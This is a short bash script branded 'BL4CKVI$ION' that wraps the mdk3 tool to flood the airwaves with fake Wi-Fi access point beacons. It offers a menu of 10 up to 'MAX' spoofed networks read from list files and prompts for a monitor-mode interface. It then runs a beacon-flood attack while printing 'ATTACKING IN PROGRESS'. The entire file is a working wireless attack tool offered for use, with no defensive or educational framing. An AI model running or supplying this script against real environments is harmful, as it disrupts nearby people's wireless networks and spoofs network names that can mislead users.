#!/bin/bash

# Colors
RED="\e[1;31m"
GREEN="\e[1;32m"
CYAN="\e[1;36m"
YELLOW="\e[1;33m"
RESET="\e[0m"

# Handle Ctrl+C
trap ctrl_c INT
function ctrl_c() {
    echo -e "\n${RED}[!] Attack stopped by user.${RESET}"
    pkill mdk3
    exit 1
}

# Banner
function show_banner() {
    echo -e "${RED}"
    echo "╔═════════════════════════════════╗"
    echo "║         BL4CKVI\$ION            ║"
    echo "╚═════════════════════════════════╝"
    echo -e "${RESET}"
}

# Main menu
function main_menu() {
    show_banner
    echo -e "${CYAN}[+] How many AP's you want to generate??${RESET}"
    echo -e "${YELLOW}(1) 10"
    echo "(2) 30"
    echo "(3) 60"
    echo "(4) 100"
    echo "(5) 200"
    echo "(6) !MAX!${RESET}"
    echo -ne "${GREEN}BL4CKVI\$ION:~# ${RESET}"
    read choice

    case $choice in
        1) list="aps/10.txt";;
        2) list="aps/30.txt";;
        3) list="aps/60.txt";;
        4) list="aps/100.txt";;
        5) list="aps/200.txt";;
        6) list="aps/max.txt";;
        *) echo -e "${RED}[!] Invalid choice${RESET}"; exit 1;;
    esac

    # Select interface
    echo -ne "${CYAN}[+] Enter your monitor mode interface (e.g., wlan0mon): ${RESET}"
    read iface

    if [ ! -f "$list" ]; then
        echo -e "${RED}[!] File not found: $list${RESET}"
        exit 1
    fi

    echo -ne "${YELLOW}[+] ATTACKING IN PROGRESS"
    spinning &
    spin_pid=$!

    # Start beacon attack
    mdk3 "$iface" b -f "$list" >/dev/null 2>&1

    kill $spin_pid
}

# Spinning dots animation
function spinning() {
    while true; do
        for dots in "." ".." "..."; do
            echo -ne "\r${YELLOW}[+] ATTACKING IN PROGRESS$dots${RESET}  "
            sleep 0.5
        done
    done
}

main_menu
